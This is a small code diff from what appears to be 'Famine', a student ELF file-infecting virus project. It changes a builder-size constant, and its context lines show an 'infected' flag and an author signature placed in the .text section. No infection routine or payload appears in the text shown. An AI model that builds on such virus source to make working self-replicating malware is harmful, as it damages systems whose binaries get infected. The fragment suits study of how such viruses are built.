@@ -8,7 +8,7 @@
 #include <sys/mman.h>
 #include <sys/syscall.h>
 
-#define BUILDER_SIZE 0x13f;
+#define BUILDER_SIZE 0x13a;
 #define BUILDER_RE_ENTRY_OFFSET 0xe5;
 __attribute__((section(".text"))) volatile static char signatur[] = "Famine | abied-ch & fbruggem";
 __attribute__((section(".text"))) volatile static uint8_t infected = 0;
